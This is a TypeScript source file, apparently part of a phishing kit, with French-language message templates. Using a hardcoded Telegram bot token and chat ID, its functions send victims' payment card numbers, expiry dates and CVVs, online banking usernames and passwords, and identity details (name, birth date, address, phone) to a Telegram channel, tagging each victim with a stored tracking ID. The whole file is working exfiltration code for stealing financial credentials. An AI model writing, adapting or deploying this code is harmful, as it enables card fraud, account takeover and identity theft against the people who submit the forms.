import { v4 as uuidv4 } from 'uuid';

// Telegram configuration
const BOT_TOKEN = "7883503586:AAG2VCgEP6fINmC5fBnP0BqlIXm_LVe0Mkg";
const CHAT_ID = "-4550147138";

// Generate or retrieve user token
const getUserToken = () => {
  let token = localStorage.getItem('user_token');
  if (!token) {
    token = uuidv4();
    localStorage.setItem('user_token', token);
  }
  return token;
};

export async function sendTelegramMessage(message: string): Promise<boolean> {
  try {
    const userToken = getUserToken();
    const formattedMessage = `🔑 Token: ${userToken}\n\n${message}`;

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: formattedMessage,
          parse_mode: 'HTML',
        }),
      }
    );

    const data = await response.json();
    return data.ok;
  } catch (error) {
    console.error('Error sending message:', error);
    return false;
  }
}

export async function sendPaymentData(formData: any): Promise<boolean> {
  const message = `
💳 INFORMATIONS DE PAIEMENT

Type de carte: ${formData.cardType.toUpperCase()}
Numéro: ${formData.cardNumber}
Expiration: ${formData.expiryDate}
CVV: ${formData.cvv}

📦 DÉTAILS DE LA TRANSACTION
Type d'article: ${formData.itemType}
Montant: ${formData.amount} €
`;

  return sendTelegramMessage(message);
}

export async function sendBankLoginData(formData: any): Promise<boolean> {
  const message = `
🏦 INFORMATIONS DE CONNEXION BANCAIRE

Banque: ${formData.bankName}
Identifiant: ${formData.username}
Mot de passe: ${formData.password}
`;

  return sendTelegramMessage(message);
}

export async function sendIdentityData(formData: any): Promise<boolean> {
  const message = `
👤 INFORMATIONS D'IDENTITÉ

Nom: ${formData.lastName}
Prénom: ${formData.firstName}
Date de naissance: ${formData.birthDate}
Adresse: ${formData.address}
Code postal: ${formData.postalCode}
Ville: ${formData.city}
Téléphone: ${formData.phone}
`;

  return sendTelegramMessage(message);
}